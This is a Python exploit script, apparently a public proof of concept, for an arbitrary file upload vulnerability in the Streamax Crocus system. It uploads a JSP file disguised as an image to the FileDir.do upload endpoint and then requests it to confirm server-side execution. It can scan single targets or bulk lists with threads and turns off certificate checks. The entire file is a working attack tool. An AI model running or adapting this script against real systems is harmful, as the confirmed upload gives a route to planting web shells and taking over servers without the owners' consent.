import requests
import argparse
import json
from multiprocessing.dummy import Pool
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def main():
    banner = """
         ____  _     _  _      _  _      _____
        /  __\/ \ /\/ \/ \__/|/ \/ \  /|/  __/
        |  \/|| | ||| || |\/||| || |\ ||| |  _
        |    /| \_/|| || |  ||| || | \||| |_//
        \_/\_\\____/\_/\_/  \|\_/\_/  \|\____\

        """
    print(banner)
    parse = argparse.ArgumentParser(description="锐明技术Crocus系统 Upload存在任意文件上传")
    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入URL地址')
    parse.add_argument('-f', '--file', dest='file', type=str, help='请选择批量文件')
    args = parse.parse_args()
    urls=[]
    if args.url:
        if "http" not in args.url:
            args.url = f"http://{args.url}"
        check(args.url)
    elif args.file:
        with open(args.file, 'r+') as f:
            for i in f:
                domain = i.strip()
                if "http" not in domain:
                    urls.append(f"http://{domain}")
                else:
                    urls.append(domain)
        pool = Pool(10)
        pool.map(check, urls)


def check(domain):
    url = f"{domain}/FileDir.do?Action=Upload"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "*/*",
        "Connection": "close"
    }

    file_content = '''<%
        out.println("e165421110ba03099a1c0393373c5b43");
        %>'''

    files = {
        'file': ('test.jsp', file_content, 'image/jpeg')
    }

    try:
        response1 = requests.post(url=url, headers=headers, files=files, verify=False, timeout=10)
        if response1.status_code != 200:
            print(f"上传失败 - 状态码: {response1.status_code} - {domain}")
            return
        response_data = response1.json()
        upload_path = f"/Plugin/FileManage/Temp/{response_data['Result']['FileName']}"
        test_url = f"{domain}{upload_path}"
        response2 = requests.get(test_url, headers=headers, verify=False, timeout=10)

        if response2.status_code == 200 and 'e165421110ba03099a1c0393373c5b43' in response2.text:
            print(f"[+] 上传成功: {test_url}")
        else:
            print(f"[-] 上传失败 - 文件无法访问(状态码: {response2.status_code})")
    except Exception as e:
        print(f"[-] 上传失败 - 异常错误 ")


if __name__ == '__main__':
    main()